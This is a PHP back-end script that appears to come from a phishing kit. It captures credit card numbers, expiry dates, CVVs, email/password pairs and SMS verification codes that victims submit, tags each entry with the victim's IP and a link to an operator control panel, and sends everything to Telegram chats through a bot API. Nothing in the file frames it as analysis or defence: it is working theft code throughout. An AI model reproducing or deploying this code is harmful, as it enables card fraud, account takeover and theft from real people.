<?php 
@session_start();
require '../config.php';


$ip = $_SERVER['REMOTE_ADDR'];

$panel_link = str_replace("app/send.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ip");

function hit($link){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $link);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	return curl_exec($c);
	curl_close($c);
}

if(isset($_POST['ad'])){
	$_SESSION['ad'] = $_POST['ad'];
	header("location: pass.php?id=".$_SESSION['ad']);
}



if(isset($_POST['cnm'])){	
$text = urlencode("
| card  - $ip
+--------------------------------------------------
| cc : ".$_POST['cnm']."
| exp : ".$_POST['exp'].",".$_POST['exp2']."
| cvv : ".$_POST['csc']."
+--------------------------------------------------
| PANEL LINK : $panel_link

");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
	hit($link);
}


header("location: wait.php");

	
}


if(isset($_POST['email1'])){	
	$text = urlencode("
	| email o pass - $ip
	+--------------------------------------------------
	| email : ".$_POST['email1']."
	| pass : ".$_POST['pass1']."
	+--------------------------------------------------
	| PANEL LINK : $panel_link
	
	");
	
	
	foreach($chat_ids as $id){
		$link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
		hit($link);
	}
	
		header("location: wait.php");
}







if(isset($_POST['sms'])){	
	$text = urlencode("
	| sms - $ip
	+--------------------------------------------------
	| sms : ".$_POST['sms']."
	+--------------------------------------------------
	| PANEL LINK : $panel_link
	
	");
	
	
	foreach($chat_ids as $id){
		$link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
		hit($link);
	}
	
		header("location: wait.php");
}
	




?>